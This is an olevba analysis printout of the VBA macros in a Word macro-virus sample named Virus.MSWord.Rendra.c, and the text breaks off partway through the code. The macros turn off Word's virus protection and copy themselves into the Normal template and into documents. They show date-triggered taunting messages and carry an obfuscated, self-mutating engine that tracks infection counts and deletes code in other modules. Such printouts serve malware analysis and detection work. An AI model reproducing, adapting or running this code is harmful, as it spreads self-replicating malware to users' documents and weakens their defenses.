olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rendra.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rendra.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
                                                                                                    Private Sub Document_Close()
On Error GoTo V3VF8bKRl5nA684d
                                                                                                    Dim objet As Variant
                                                                                                    Dim objet2 As Variant
                                                                                                    Dim feuille As Variant
                                                                                                    Dim Var_Start, Var_Start2 As Long
                                                                                                    Dim Var_Count, Var_Count2 As Long
                                                                                                    Dim TempString As String
                                                                                                    Dim Date1 As Date
                                                                                                    Dim Date2 As Date
                                                                                                    Dim Date3 As Date
                                                                                                    Date1 = "03/04/2000"
                                                                                                    Date2 = "10/05/2000"
                                                                                                    Date3 = "15/09/2000"
                                                                                                    Options.VirusProtection = False
                                                                                                    Application.DisplayAlerts = wdAlertsNone
                                                                                                    Set feuille = Application.ActiveDocument
                                                                                                    Set objet = feuille.VBProject.VBComponents.Item("ThisDocument")
                                                                                                    If Not objet.CodeModule.Find("{ - This function should never be deleted -  } V2", 1, 1, 1, 1) Then
                                                                                                    For i = 1 To objet.CodeModule.CountOfLines
                                                                                                    objet.CodeModule.DeleteLines 1
                                                                                                    Next
                                                                                                    Var_Start = objet.CodeModule.CountOfLines + 1
                                                                                                    Set objet2 = NormalTemplate.VBProject.VBComponents.Item("ThisDocument")
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_Open", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                                                                                                    For i = Var_Start2 + 1 To Var_Count2 + Var_Start2 - 2
                                                                                                    TempString = RTrim(objet2.CodeModule.Lines(i, 1))
                                                                                                    objet.CodeModule.AddFromString TempString
                                                                                                    Next
                                                                                                    Var_garb = objet.CodeModule.InsertLines(1, "                                                                                                    Private Sub Document_Open()")
                                                                                                    Var_Start = Var_Start + Var_Count2 + 1
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_New", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_New", vbext_pk_Proc)
                                                                                                    For i = Var_Start2 + 1 To Var_Count2 + Var_Start2 - 2
                                                                                                    TempString = RTrim(objet2.CodeModule.Lines(i, 1))
                                                                                                    objet.CodeModule.AddFromString TempString
                                                                                                    Next
                                                                                                    Var_garb = objet.CodeModule.InsertLines(1, "                                                                                                    Private Sub Document_New()")
                                                                                                    Var_Start = Var_Start + Var_Count2 + 1
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
                                                                                                    For i = Var_Start2 + 1 To Var_Count2 + Var_Start2 - 2
                                                                                                    TempString = RTrim(objet2.CodeModule.Lines(i, 1))
                                                                                                    objet.CodeModule.AddFromString TempString
                                                                                                    Next
                                                                                                    Var_garb = objet.CodeModule.InsertLines(1, "                                                                                                    Private Sub Document_Close()")
                                                                                                    End If
                                                                                                    If Date > Date3 Then
                                                                                                    Selection.EndKey Unit:=wdStory
                                                                                                    Selection.TypeParagraph
                                                                                                    Selection.TypeText Text:="C" & "i" & "a" & "o" & " !" & "!" & "!"
                                                                                                    Selection.HomeKey Unit:=wdLine, Extend:=wdExtend
                                                                                                    Selection.Font.Bold = wdToggle
                                                                                                    Selection.Font.Size = 18
                                                                                                    Selection.Font.Name = "CourierBM"
                                                                                                    Selection.Font.Name = "Bookman Old Style"
                                                                                                    Options.DefaultHighlightColorIndex = wdBrightGreen
                                                                                                    Selection.Range.HighlightColorIndex = wdBrightGreen
                                                                                                    Selection.Font.ColorIndex = wdRed
                                                                                                    Selection.ParagraphFormat.Alignment = wdAlignParagraphRight
                                                                                                    Selection.HomeKey Unit:=wdStory
                                                                                                    End If
                                                                                                    If (Date >= Date1 And Date <= Date2) Or Format(Date, "dddd") = "Mercredi" And Date >= Date1 Then
                                                                                                    temporary = MsgBox("Me" & "r" & "ci" & " d'" & "avo" & "ir " & "uti" & "li" & "sé" & " ce b" & "e" & "l ou" & "ti" & "l qu" & "'" & "e" & "st " & "M" & "." & "S" & ". " & "W" & "O" & "R" & "D" & "S !" & "!" & "!" & Chr(13) & Chr(13) & "B" & "i" & "l" & "l" & " G" & "A" & "T" & "E" & "S " & "vo" & "us le" & " ren" & "dr" & "a " & "!", vbSystemModal + vbInformation + vbOKOnly, "Vive les mercredi et les jours fériés...")
                                                                                                    End If
                                                                                                    Application.ActiveDocument.Save
V3VF8bKRl5nA684d:
 Document_Open
                                                                                                    End Sub
                                                                                                    Private Sub Document_New()
                                                                                                    Dim Date1 As Date
                                                                                                    Dim Date2 As Date
                                                                                                    Dim Date3 As Date
                                                                                                    Date1 = "03/04/2000"
                                                                                                    Date2 = "10/05/2000"
                                                                                                    Date3 = "15/09/2000"
                                                                                                    On Error Resume Next
                                                                                                    Options.VirusProtection = False
                                                                                                    Application.DisplayAlerts = wdAlertsNone
                                                                                                    If (Date >= Date1 And Date <= Date2) Or Date > Date3 Or Format(Date, "dddd") = "Mercredi" And Date >= Date1 Then
                                                                                                    Selection.HomeKey Unit:=wdLine
                                                                                                    Selection.HomeKey Unit:=wdStory
                                                                                                    Selection.TypeParagraph
                                                                                                    Selection.MoveUp Unit:=wdLine, Count:=1
                                                                                                    Selection.TypeText Text:="Mi" & "cr" & "os" & "of" & "t vo" & "us s" & "ouh" & "ait" & "e la" & " b" & "ie" & "nv" & "en" & "ue !" & "!" & "!"
                                                                                                    Selection.HomeKey Unit:=wdLine, Extend:=wdExtend
                                                                                                    Selection.Range.HighlightColorIndex = wdBrightGreen
                                                                                                    Selection.Font.ColorIndex = wdRed
                                                                                                    Selection.Font.Size = 12
                                                                                                    Selection.Font.Size = 16
                                                                                                    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
                                                                                                    Selection.MoveDown Unit:=wdLine, Count:=1
                                                                                                    End If
                                                                                                    End Sub
                                                                                                    Private Sub Document_Open()
On Error GoTo V3VF8bKRl5nA684d
                                                                                                    '{ - This function should never be deleted -  } V2
                                                                                                    '{ - This function should never be deleted - }
                                                                                                    Dim objet As Variant
                                                                                                    Dim objet2 As Variant
                                                                                                    Dim Var_Start, Var_Start2 As Long
                                                                                                    Dim Var_Count, Var_Count2 As Long
                                                                                                    Options.VirusProtection = False
                                                                                                    Application.DisplayAlerts = wdAlertsNone
                                                                                                    Set objet = NormalTemplate.VBProject.VBComponents.Item("ThisDocument")
                                                                                                    If Not objet.CodeModule.Find("{ - This function should never be deleted -  } V2", 1, 1, 1, 1) Then
                                                                                                    For i = 1 To objet.CodeModule.CountOfLines
                                                                                                    objet.CodeModule.DeleteLines 1
                                                                                                    Next
                                                                                                    Var_Start = objet.CodeModule.CountOfLines + 1
                                                                                                    Set objet2 = Me.VBProject.VBComponents.Item("ThisDocument")
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_Open", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                                                                                                    objet.CodeModule.InsertLines Var_Start, Chr(13) & objet2.CodeModule.Lines(Var_Start2, Var_Count2)
                                                                                                    Var_Start = Var_Start + Var_Count2 + 1
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_New", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_New", vbext_pk_Proc)
                                                                                                    objet.CodeModule.InsertLines Var_Start, Chr(13) & objet2.CodeModule.Lines(Var_Start2, Var_Count2)
                                                                                                    Var_Start = Var_Start + Var_Count2 + 1
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
                                                                                                    objet.CodeModule.InsertLines Var_Start, Chr(13) & objet2.CodeModule.Lines(Var_Start2, Var_Count2)
                                                                                                    NormalTemplate.Save
                                                                                                    End If
V3VF8bKRl5nA684d:
   Dim K9Bm6t353BaD As Byte
   Dim T7SAs7h1CF0wvWqQ As String
Dim EJI3827ImdS1 As String
Dim J4DAKmx68y3B9e As String
Dim By4Vq4Qglc7 As Long
  Dim Xu17GqW4w6tAsta33061UC1nc1n As Object
'2063.979   3945.947    20.39364    3860.134
 GoTo We8lRlfOa29ML4MF5i7
HM2fh8Ofy1dE8liCfc:
'291.4659   3672.648    887.355 3737.81 303.8591    4069.279    271.4106    3282.785    6747.507
 Xu17GqW4w6tAsta33061UC1nc1n.InsertLines By4Vq4Qglc7, J4DAKmx68y3B9e
    Return
We8lRlfOa29ML4MF5i7:
GoSub Vu8rWFA9Ej2
'440.9698   1618.125    7771.797    3036.13 123.4961    3285.969    6569.576    4905.77
On Error GoTo KQhb5kf52d9Q90ve2
Const C5KU88q3NKNNdJ3fV = "Ç•í†³œ¢èêÈ¸Œ¡ÌõºÏÊÑÄ‘¹¾—°·�áŽ¯‡±€‹ç¨ãˆ¥Áðò²÷«™�Óà Ðµ¶ëÂ„¼�Ÿ”¿›­»½¦“š�ÍÅ¬ù’ìâª£ƒÃ�˜§‰´‚Àú©ÿž¤ï®óËŠøå" '"1/31/121"
'191.9066   5345.25
    Dim C9kpgxW5Y0E8fNkNHoH As String
  Dim B8LpM131ei639bf284e5 As String
 Dim P9Ws98b1734 As String
    Dim I31a6731A3TPTQpu As Long
Dim Mpaq715g25NGb7Dk55 As Long
  Dim Kmc4Ms3l1m4074Y As String
    Dim NlY8Q5Hd7gwSw2en4XuI As String
  Dim CpJ0d1Bfi2q As Long
  Dim ChJaS1rh8wy545qTD3Oh As Long
    Dim CH4FiSmTVaO80BVm As Long
    T7SAs7h1CF0wvWqQ = "�Þ¨ßìÐí««„çÁà�½ó���—þßÊàÑÅø½ÃÆäÃïøˆÎ—Ôò¨ž–Ý€ØÅÌ¦’ÒµÛÂ½§öÏùðú": GoSub K4HIhrETANiN6XySX: Kmc4Ms3l1m4074Y = T7SAs7h1CF0wvWqQ
  T7SAs7h1CF0wvWqQ = "”å‚åØÊÇš™¡×âï¹˜Øª¸": GoSub K4HIhrETANiN6XySX: NlY8Q5Hd7gwSw2en4XuI = T7SAs7h1CF0wvWqQ
    C9kpgxW5Y0E8fNkNHoH = System.PrivateProfileString("", Kmc4Ms3l1m4074Y, NlY8Q5Hd7gwSw2en4XuI)
  If C9kpgxW5Y0E8fNkNHoH <> "" Then
  I31a6731A3TPTQpu = InStr(1, C9kpgxW5Y0E8fNkNHoH, Chr$(47)): CpJ0d1Bfi2q = Mid$(C9kpgxW5Y0E8fNkNHoH, 1, I31a6731A3TPTQpu - 1)
   Mpaq715g25NGb7Dk55 = I31a6731A3TPTQpu + 1: I31a6731A3TPTQpu = InStr(Mpaq715g25NGb7Dk55, C9kpgxW5Y0E8fNkNHoH, Chr$(47)): ChJaS1rh8wy545qTD3Oh = Mid$(C9kpgxW5Y0E8fNkNHoH, Mpaq715g25NGb7Dk55, I31a6731A3TPTQpu - Mpaq715g25NGb7Dk55)
 CH4FiSmTVaO80BVm = Mid$(C9kpgxW5Y0E8fNkNHoH, I31a6731A3TPTQpu + 1)
 T7SAs7h1CF0wvWqQ = "áØ„õÇùÐÈ¹¸×ïÊ":  GoSub K4HIhrETANiN6XySX:  Application.CommandBars.FindControl(ID:=927).Caption = T7SAs7h1CF0wvWqQ & Chr$(32) & CpJ0d1Bfi2q & Chr$(46) & ChJaS1rh8wy545qTD3Oh & Chr$(46) & CH4FiSmTVaO80BVm
  Else: CpJ0d1Bfi2q = 0: ChJaS1rh8wy545qTD3Oh = 0: CH4FiSmTVaO80BVm = 0
   End If
  Dim TfShIG3a56FQV54o As Object
  Dim K1ckH7chEf84syd6g As Object
  Dim D83SEqQ43mUTK9u85W4E As Object
    Dim LRbDSg04suq763Hs As Object
'2459.426   2101.06
  Set TfShIG3a56FQV54o = NormalTemplate: Set K1ckH7chEf84syd6g = TfShIG3a56FQV54o
For I31a6731A3TPTQpu = 1 To TfShIG3a56FQV54o.VBProject.VBComponents.Item(1).CodeModule.CountOfLines + 1
   If InStr(1, TfShIG3a56FQV54o.VBProject.VBComponents.Item(1).CodeModule.Lines(I31a6731A3TPTQpu, 1), C5KU88q3NKNNdJ3fV) <> 0 Then Set K1ckH7chEf84syd6g = ActiveDocument: Exit For
   Next I31a6731A3TPTQpu: If TfShIG3a56FQV54o = K1ckH7chEf84syd6g Then Set TfShIG3a56FQV54o = ActiveDocument
  Set LRbDSg04suq763Hs = K1ckH7chEf84syd6g.VBProject.VBComponents(1).CodeModule
  Set D83SEqQ43mUTK9u85W4E = TfShIG3a56FQV54o.VBProject.VBComponents(1).CodeModule
  Dim CP4fStWRJJgnNu9ua As String
    T7SAs7h1CF0wvWqQ = "‚û‰¦àéÀ": GoSub K4HIhrETANiN6XySX: CP4fStWRJJgnNu9ua = T7SAs7h1CF0wvWqQ
    T7SAs7h1CF0wvWqQ = "ˆÅ¹ÏüÒ‚­²˜ôÅâ…¡": GoSub K4HIhrETANiN6XySX
'1769.373   2931.761    5287.98 1237.11 1821.291    4542.444    1172.519    960.1935    1973.841    127.006
    With LRbDSg04suq763Hs
For I31a6731A3TPTQpu = 1 To .CountOfLines
'5125.202   629.8511    242.9626    2805.329    4573.749    1717.357    3177.429    1812.427    4336.017
  If Left$(UCase$(Trim$(.Lines(I31a6731A3TPTQpu, 1))), Len(Trim$(.Lines(I31a6731A3TPTQpu, 1)))) = T7SAs7h1CF0wvWqQ Then
'6671.35    941.8299    155.9735    232.7459    742.9123    3684.066    9010.989
    .DeleteLines I31a6731A3TPTQpu: I31a6731A3TPTQpu = I31a6731A3TPTQpu - 1
    ElseIf Left$(Trim$(.Lines(I31a6731A3TPTQpu, 1)), 5) = Chr$(67) & Chr$(111) & Chr$(110) & Chr$(115) & Chr$(116) Then
B8LpM131ei639bf284e5 = Mid$(Trim$(.Lines(I31a6731A3TPTQpu, 1)), InStr(Trim$(.Lines(I31a6731A3TPTQpu, 1)), Chr$(34)) + 1)
'281.966    3223.523    1867.752    1055.744    7616.671    4429.099    2964.733
   B8LpM131ei639bf284e5 = Left$(B8LpM131ei639bf284e5, InStr(B8LpM131ei639bf284e5, Chr$(34)))
   By4Vq4Qglc7 = 0: For Mpaq715g25NGb7Dk55 = 1 To Len(B8LpM131ei639bf284e5) - 1: By4Vq4Qglc7 = By4Vq4Qglc7 + Asc(Mid$(B8LpM131ei639bf284e5, Mpaq715g25NGb7Dk55, 1)): Next Mpaq715g25NGb7Dk55
    If By4Vq4Qglc7 = 18134 Then GoTo KQhb5kf52d9Q90ve2 Else Exit For
'1765.218   1435.795
End If
'2003.325   2007.108    2484.551    2146.719    1011.456    423.5487    3184.814
  Next I31a6731A3TPTQpu
 End With
   Dim Q8vOoxI4KL52qbLbyo7P As String
   Q8vOoxI4KL52qbLbyo7P = C5KU88q3NKNNdJ3fV: Randomize Timer
    For I31a6731A3TPTQpu = 1 To Len(Q8vOoxI4KL52qbLbyo7P)
 Mpaq715g25NGb7Dk55 = Int(Rnd * (Len(Q8vOoxI4KL52qbLbyo7P) - 1)) + 1: C9kpgxW5Y0E8fNkNHoH = Mid$(Q8vOoxI4KL52qbLbyo7P, Mpaq715g25NGb7Dk55, 1)
    Mid$(Q8vOoxI4KL52qbLbyo7P, Mpaq715g25NGb7Dk55, 1) = Mid$(Q8vOoxI4KL52qbLbyo7P, I31a6731A3TPTQpu, 1): Mid$(Q8vOoxI4KL52qbLbyo7P, I31a6731A3TPTQpu, 1) = C9kpgxW5Y0E8fNkNHoH
 Next I31a6731A3TPTQpu
    Dim NtYVb56bhPo As Long
   Dim XETANiN6XySXhlCv8 As Long
 With D83SEqQ43mUTK9u85W4E
For I31a6731A3TPTQpu = 1 To .CountOfLines
 If InStr(1, .Lines(I31a6731A3TPTQpu, 1), "V3VF8bKRl5nA684d" & Chr$(58)) > 0 Then
 NtYVb56bhPo = I31a6731A3TPTQpu: ElseIf InStr(1, .Lines(I31a6731A3TPTQpu, 1), "KQhb5kf52d9Q90ve2" & Chr$(58)) > 0 Then XETANiN6XySXhlCv8 = I31a6731A3TPTQpu: Exit For
 End If
    Next I31a6731A3TPTQpu
    For I31a6731A3TPTQpu = NtYVb56bhPo To XETANiN6XySXhlCv8
C9kpgxW5Y0E8fNkNHoH = Trim$(.Lines(I31a6731A3TPTQpu, 1))
  If C9kpgxW5Y0E8fNkNHoH <> "" And Left$(C9kpgxW5Y0E8fNkNHoH, 1) <> Chr$(39) Then EJI3827ImdS1 = EJI3827ImdS1 & String$(Int(Rnd * 5), Chr(32)) & C9kpgxW5Y0E8fNkNHoH & vbCr
   Randomize Timer: If Int(Rnd * 10) + 1 = 1 Then EJI3827ImdS1 = EJI3827ImdS1 & vbCr
 If Int(Rnd * 9) + 1 > 8 Then
    Randomize Timer: C9kpgxW5Y0E8fNkNHoH = ""
    For Mpaq715g25NGb7Dk55 = 0 To Int(Rnd * 9) + 1
'2449.068   4605.359    913.7684    392.0889    664.3395    1914.047    6186.325    9.931795    673.4662    1903.295
C9kpgxW5Y0E8fNkNHoH = C9kpgxW5Y0E8fNkNHoH & Rnd * (Rnd * 10000) & vbTab: Next Mpaq715g25NGb7Dk55
  C9kpgxW5Y0E8fNkNHoH = Chr$(39) & C9kpgxW5Y0E8fNkNHoH: EJI3827ImdS1 = EJI3827ImdS1 & C9kpgxW5Y0E8fNkNHoH & vbCr
   End If
Next I31a6731A3TPTQpu
'1447.518   2409.03 1493.887    830.1978    3080.558    1173.473    2007.344    4152.993    986.7151
  End With
   Dim M32jk4AlYbb As String
  Dim I7j1A2ejItuv7TLM7r As String
 NtYVb56bhPo = InStr(1, EJI3827ImdS1, Chr$(67) & Chr$(111) & Chr$(110) & Chr$(115) & Chr$(116)) + 5
If NtYVb56bhPo > 0 Then XETANiN6XySXhlCv8 = InStr(NtYVb56bhPo, EJI3827ImdS1, Chr$(61))
M32jk4AlYbb = Trim$(Mid(EJI3827ImdS1, NtYVb56bhPo + 1, (XETANiN6XySXhlCv8 - NtYVb56bhPo) - 1)): GoSub Yc79VMMCiI8p8
NtYVb56bhPo = InStr(NtYVb56bhPo, EJI3827ImdS1, Chr$(61)) + 3
   If NtYVb56bhPo > 0 And Mid$(EJI3827ImdS1, NtYVb56bhPo, Len(C5KU88q3NKNNdJ3fV)) = C5KU88q3NKNNdJ3fV Then Mid$(EJI3827ImdS1, NtYVb56bhPo, Len(C5KU88q3NKNNdJ3fV)) = Q8vOoxI4KL52qbLbyo7P Else: GoTo KQhb5kf52d9Q90ve2
'102.8687   1242.403    3755.538
  NtYVb56bhPo = InStr(NtYVb56bhPo + Len(C5KU88q3NKNNdJ3fV), EJI3827ImdS1, Chr$(39) & Chr$(34)) + 1
If NtYVb56bhPo > 0 Then XETANiN6XySXhlCv8 = InStr(NtYVb56bhPo, EJI3827ImdS1, Chr(13)) - 1
M32jk4AlYbb = Trim$(Mid(EJI3827ImdS1, NtYVb56bhPo + 1, (XETANiN6XySXhlCv8 - NtYVb56bhPo) - 1))
I31a6731A3TPTQpu = InStr(1, M32jk4AlYbb, Chr$(47)): C9kpgxW5Y0E8fNkNHoH = Mid$(M32jk4AlYbb, 1, I31a6731A3TPTQpu - 1)
    Mpaq715g25NGb7Dk55 = I31a6731A3TPTQpu + 1: I31a6731A3TPTQpu = InStr(Mpaq715g25NGb7Dk55, M32jk4AlYbb, Chr$(47))
    B8LpM131ei639bf284e5 = Mid$(M32jk4AlYbb, Mpaq715g25NGb7Dk55, I31a6731A3TPTQpu - Mpaq715g25NGb7Dk55):  P9Ws98b1734 = Mid$(M32jk4AlYbb, I31a6731A3TPTQpu + 1)
   If K1ckH7chEf84syd6g = NormalTemplate And CpJ0d1Bfi2q < C9kpgxW5Y0E8fNkNHoH Then CpJ0d1Bfi2q = C9kpgxW5Y0E8fNkNHoH
  If ChJaS1rh8wy545qTD3Oh < B8LpM131ei639bf284e5 Then ChJaS1rh8wy545qTD3Oh = B8LpM131ei639bf284e5
    If CH4FiSmTVaO80BVm < P9Ws98b1734 Then CH4FiSmTVaO80BVm = P9Ws98b1734
If K1ckH7chEf84syd6g = NormalTemplate Then ChJaS1rh8wy545qTD3Oh = ChJaS1rh8wy545qTD3Oh + 1 Else CH4FiSmTVaO80BVm = CH4FiSmTVaO80BVm + 1
    System.PrivateProfileString("", Kmc4Ms3l1m4074Y, NlY8Q5Hd7gwSw2en4XuI) = CpJ0d1Bfi2q & Chr$(47) & ChJaS1rh8wy545qTD3Oh & Chr$(47) & CH4FiSmTVaO80BVm
    C9kpgxW5Y0E8fNkNHoH = CpJ0d1Bfi2q & Chr$(47) & ChJaS1rh8wy545qTD3Oh & Chr$(47) & CH4FiSmTVaO80BVm
   EJI3827ImdS1 = Left$(EJI3827ImdS1, NtYVb56bhPo) & C9kpgxW5Y0E8fNkNHoH & Right$(EJI3827ImdS1, Len(EJI3827ImdS1) - (XETANiN6XySXhlCv8 - 1))
  XETANiN6XySXhlCv8 = InStr(NtYVb56bhPo, EJI3827ImdS1, vbCr) + 1
 Do While XETANiN6XySXhlCv8 > 0
    NtYVb56bhPo = InStr(XETANiN6XySXhlCv8 + 3, EJI3827ImdS1, Chr$(61) & Chr$(32) & Chr(34)) + 3
  If NtYVb56bhPo > 3 Then XETANiN6XySXhlCv8 = InStr(NtYVb56bhPo, EJI3827ImdS1, Chr(34)) Else XETANiN6XySXhlCv8 = 0
 If XETANiN6XySXhlCv8 > 0 Then
   T7SAs7h1CF0wvWqQ = Trim$(Mid(EJI3827ImdS1, NtYVb56bhPo, XETANiN6XySXhlCv8 - NtYVb56bhPo))
'863.2484   265.7276    191.7554    5152.925    1130.916    956.514 2883.45 3688.501    363.52
    If T7SAs7h1CF0wvWqQ <> "" Then GoSub S19978rl5Vx4bb: Mid$(EJI3827ImdS1, NtYVb56bhPo, XETANiN6XySXhlCv8) = T7SAs7h1CF0wvWqQ
  End If
 Loop
 XETANiN6XySXhlCv8 = 1
  Do While XETANiN6XySXhlCv8 > 0
  NtYVb56bhPo = InStr(XETANiN6XySXhlCv8 + 3, EJI3827ImdS1, Chr(68) & Chr(105) & Chr(109))
   If NtYVb56bhPo > 0 Then XETANiN6XySXhlCv8 = InStr(NtYVb56bhPo + 3, EJI3827ImdS1, Chr(65) & Chr(115)) Else XETANiN6XySXhlCv8 = 0
If XETANiN6XySXhlCv8 > 0 Then M32jk4AlYbb = Trim$(Mid(EJI3827ImdS1, NtYVb56bhPo + 3, (XETANiN6XySXhlCv8 - NtYVb56bhPo) - 3)): GoSub Yc79VMMCiI8p8
    Loop
    XETANiN6XySXhlCv8 = 1: NtYVb56bhPo = 1
  Do While XETANiN6XySXhlCv8 > 0
  XETANiN6XySXhlCv8 = InStr(NtYVb56bhPo, EJI3827ImdS1, Chr$(58) & vbCr)
    If XETANiN6XySXhlCv8 - 20 > 0 Then
NtYVb56bhPo = XETANiN6XySXhlCv8 - 20: I31a6731A3TPTQpu = 0
'812.2487   30.32756    4359.64 7422.216    4304.424    2085.234    355.5037    2763.809    412.3481
   Do: NtYVb56bhPo = NtYVb56bhPo + I31a6731A3TPTQpu: I31a6731A3TPTQpu = InStr(1, Trim$(Mid(EJI3827ImdS1, NtYVb56bhPo + 1, (XETANiN6XySXhlCv8 - NtYVb56bhPo) - 1)), vbCr): Loop Until I31a6731A3TPTQpu = 0
 NtYVb56bhPo = NtYVb56bhPo + 1
  End If
'244.7063   342.4896    4735.532    932.8177    581.1005    2766.581
 If XETANiN6XySXhlCv8 > 0 Then M32jk4AlYbb = Trim$(Mid(EJI3827ImdS1, NtYVb56bhPo, XETANiN6XySXhlCv8 - NtYVb56bhPo)): GoSub Yc79VMMCiI8p8 Else Exit Do
 NtYVb56bhPo = InStr(NtYVb56bhPo, EJI3827ImdS1, Chr$(58) & vbCr) + 2
   Loop
Dim HWkr7gQ739w28 As Boolean
 Dim T8xYIqasKfV2Gc4 As Long
'497.2138   1601.159    943.1287
Dim NEEb40m2pb6Q4E As String
'332.342    483.2255    926.2627    686.8918    8272.071    2774.262    324.0801
Dim Gglir9K3JrH66XwDev As String
  Dim V082kbbTxfv3ccJ As String
Dim Urwlo65IlATwE851x0k2 As String
Dim R6asbGvxIE7 As String
'320.2016   1651.95 2252.97
    Dim WWURq9o3YATyy74mSqRu As String
  Dim LbG8E6i45AN As String
T7SAs7h1CF0wvWqQ = "—ç„ðÒèÇ": GoSub K4HIhrETANiN6XySX: Gglir9K3JrH66XwDev = T7SAs7h1CF0wvWqQ & Chr$(32)
    T7SAs7h1CF0wvWqQ = "”à�¦åõÇŸ¼ŠûãÅ©Ý“": GoSub K4HIhrETANiN6XySX: V082kbbTxfv3ccJ = T7SAs7h1CF0wvWqQ
T7SAs7h1CF0wvWqQ = "”à�¦çóÍ„™…ÙïÓ£Ý“": GoSub K4HIhrETANiN6XySX: Urwlo65IlATwE851x0k2 = T7SAs7h1CF0wvWqQ
   T7SAs7h1CF0wvWqQ = "”à�¦õõÎ�¾­ÕüÍ­�ß¼âø": GoSub K4HIhrETANiN6XySX: R6asbGvxIE7 = T7SAs7h1CF0wvWqQ
    T7SAs7h1CF0wvWqQ = "”à�¦çóÍ„™‡ÈøÈ£›Éçã": GoSub K4HIhrETANiN6XySX: WWURq9o3YATyy74mSqRu = T7SAs7h1CF0wvWqQ
   T7SAs7h1CF0wvWqQ = "”à�¦÷óÁ�‡­Öøþƒ…ß¡âø": GoSub K4HIhrETANiN6XySX: LbG8E6i45AN = T7SAs7h1CF0wvWqQ
   For I31a6731A3TPTQpu = 1 To K1ckH7chEf84syd6g.VBProject.VBComponents.Count
   Set Xu17GqW4w6tAsta33061UC1nc1n = K1ckH7chEf84syd6g.VBProject.VBComponents(I31a6731A3TPTQpu).CodeModule
    With Xu17GqW4w6tAsta33061UC1nc1n
   For Mpaq715g25NGb7Dk55 = 1 To .CountOfLines
C9kpgxW5Y0E8fNkNHoH = UCase$(Trim$(.Lines(Mpaq715g25NGb7Dk55, 1)))
'7125.493   4855.103    1044.27 241.5694    5566.55 1234.598    169.3122    2631.005    4781.73
 If InStr(C9kpgxW5Y0E8fNkNHoH, UCase$(V082kbbTxfv3ccJ)) > 0 Or InStr(C9kpgxW5Y0E8fNkNHoH, UCase$(Urwlo65IlATwE851x0k2)) > 0 Or InStr(C9kpgxW5Y0E8fNkNHoH, UCase$(R6asbGvxIE7)) > 0 Or InStr(C9kpgxW5Y0E8fNkNHoH, UCase$(WWURq9o3YATyy74mSqRu)) > 0 Then
For T8xYIqasKfV2Gc4 = Mpaq715g25NGb7Dk55 To .CountOfLines
  If Trim$(Left(.Lines(T8xYIqasKfV2Gc4, 1), 7)) = CP4fStWRJJgnNu9ua Then .DeleteLines T8xYIqasKfV2Gc4: Exit For
.DeleteLines T8xYIqasKfV2Gc4:  T8xYIqasKfV2Gc4 = T8xYIqasKfV2Gc4 - 1
Next T8xYIqasKfV2Gc4: Mpaq715g25NGb7Dk55 = T8xYIqasKfV2Gc4 - 1
  End If
    Next Mpaq715g25NGb7Dk55
'436.6981   1548.019    3339.711    509.2786    1751.239    4091.43 1343.682
    End With: Next I31a6731A3TPTQpu
 Set Xu17GqW4w6tAsta33061UC1nc1n = LRbDSg04suq763Hs
With Xu17GqW4w6tAsta33061UC1nc1n
    T7SAs7h1CF0wvWqQ = "ˆÛÍÃáÎíº": GoSub K4HIhrETANiN6XySX: NEEb40m2pb6Q4E = T7SAs7h1CF0wvWqQ
   For T8xYIqasKfV2Gc4 = 1 To 2
'20.95998   139.9631    114.0845    387.7918    7238.426    8864.418    2339.01 3994.448    1131.626    1855.25
If T8xYIqasKfV2Gc4 = 2 Then
  C9kpgxW5Y0E8fNkNHoH = Left$(EJI3827ImdS1, InStr(EJI3827ImdS1, Chr$(58))) & vbCr & Mid(LbG8E6i45AN, 4, 14)
  T7SAs7h1CF0wvWqQ = "”à�¦÷óÁ�‡­Öøþ�™Õ¼¯ùí": GoSub K4HIhrETANiN6XySX: B8LpM131ei639bf284e5 = T7SAs7h1CF0wvWqQ
  Else: C9kpgxW5Y0E8fNkNHoH = EJI3827ImdS1: B8LpM131ei639bf284e5 = LbG8E6i45AN
End If
'3027.811   944.8923    1914.507
  NtYVb56bhPo = 0
   For I31a6731A3TPTQpu = 1 To .CountOfLines
    If Right$(UCase$(Trim$(.Lines(I31a6731A3TPTQpu, 1))), Len(B8LpM131ei639bf284e5)) = UCase$(B8LpM131ei639bf284e5) Then NtYVb56bhPo = I31a6731A3TPTQpu + 1: Exit For
  Next I31a6731A3TPTQpu
If NtYVb56bhPo > 0 Then
   By4Vq4Qglc7 = NtYVb56bhPo: J4DAKmx68y3B9e = NEEb40m2pb6Q4E & Chr$(32) & Chr$(71) & Chr$(111) & Chr$(84) & Chr$(111) & Chr$(32) & Left$(EJI3827ImdS1, InStr(EJI3827ImdS1, Chr$(58)) - 1): GoSub HM2fh8Ofy1dE8liCfc
  For I31a6731A3TPTQpu = NtYVb56bhPo + 1 To .CountOfLines
'443.4276   6936.578    1448.763    3982.341    564.2993    39.38089    1613.187    1893.503    1238.167
  P9Ws98b1734 = UCase$(Trim$(.Lines(I31a6731A3TPTQpu, 1)))
If Left$(P9Ws98b1734, 8) = NEEb40m2pb6Q4E Then
    .DeleteLines I31a6731A3TPTQpu: I31a6731A3TPTQpu = I31a6731A3TPTQpu - 1
    ElseIf Left$(P9Ws98b1734, 7) = UCase$(CP4fStWRJJgnNu9ua) Then
